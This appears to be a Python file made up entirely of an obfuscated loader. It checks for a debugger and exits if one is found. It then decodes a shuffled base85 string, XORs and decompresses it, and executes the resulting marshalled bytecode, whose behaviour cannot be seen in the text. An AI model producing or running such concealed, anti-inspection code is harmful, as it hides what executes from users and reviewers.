# PT_REV:eyJ2IjoxLCJzYWx0IjoieU9yUlo0UXVjK3RXbmdNbjd5ek01Zz09IiwiY2lwaGVyIjoiYmVpZk5BSkJQb2VESjE3N3FzODd6TU9RM1dJZHdVUzh0ZTBhZjhyV3AxdVg3UjVCQU5MU1Fna0N6aG5NYk9nSnVPMUdhRG1hRVFxYkl0TzNaTE5jY3AxNzdhcEZpVnM9IiwidGFnIjoiYjUwOTAwODMzOTc1NWQzYzYwMjZkMWIyMmE2M2E1YTk5N2MwM2FkNjk0MmFhMDg4MzVhZWI4ZjE5NDA0YTZlMiJ9
import sys as _0
if getattr(_0,'gettrace')():raise SystemExit
_1=__import__;_2=_1('builtins');_3=_1('base64');_4=_1('zlib');_5=_1('marshal')
_6=[(3, 'KcEZP^OvnR~7nRV&?6c5*@lL!iNqIbHO#x)+Rt9g-^sbj~+PdJx1!nZA$Qo7JVTDN0k4ig2o`'), (10, 'G%SI7NV~4zk!f%^02I?JUXZDj0Z54*s*#bmA*FnVS*@PS7hyCD~Qwo2H~q9MUNYPqHiwrgXtu'), (17, '8_1o85&$d!0tS)nFH#c$r0qi_AGNVJwg_UED9&HsKBU1Z^qDdDvx3Cp6_r;xrtkxhGtDE-q0-'), (24, 'o&2_0Mim$g=8@z48mE(@FL4b*~Sfd~=o3i`-pm<VQfEL~|&X>V1eDxk=D`2^!_%Xgj0@nWxwo'), (31, '&ny~ZQ=*aRTO`(oRKAVuU%1jsEDzpC9`$X002IaYWdp*VA*Je$UxL_V{=-H+#b?u+P1=EcVLU'), (38, '^Qjd=DFO1r3gF45>CYbR8tc&z0!<2Pq2+iy<F6}LS2RK!*A-_#cd8wP#1{$p$-eTF!q0n-FH9'), (45, '>8+Svy!Lu>H&d@9SRcq;dqy3sep-%0~*5A|5(?Q>{En)<Q1Blr7FmzAsE>8eGTTg*I0cKUu&^'), (52, 'xqx%&D)yhJTk?pDUfz>KEYkeo0$lbD`J5gvIRkSGwoD)=d~8W-ddC2tj_h8fpIZP_Un?t^>Nf'), (59, 'U2i$v$3j34!CnRh2|N}73%k_lw%o_#0PpE0)kH058|U)q_13>1Q~J~}!K)=0Pu^^OTSn3|cVu'), (66, '-FTnbG$)qeQMpI0Aztgg;%ZPs61r0aL7ag1>RA{?GiaRmG4aA`RKIM+Mywe8b*}NImXckFpI{'), (73, 'CdDl_v+=_aTOrK;TmnK{;rlt#9?_i4IexB(^Ydx89J|}8V9aHJzXY>&9`sg=ap>Yi7@E3<khh'), (80, 'A@32kCtT;~M4rEr`5Ve')]
_7=''.join(_9 for _8,_9 in sorted(_6,key=lambda _a:_a[0]))[::-1]
_k=[5, 77, 135, 172, 226, 207, 114, 4, 245, 220, 248, 145, 223, 143, 48, 84, 130]
_d=bytearray(_3.b85decode(_7))
for _i in range(len(_d)):_d[_i]^=_k[_i%len(_k)]
getattr(_2,'exec')(_5.loads(_4.decompress(bytes(_d))))
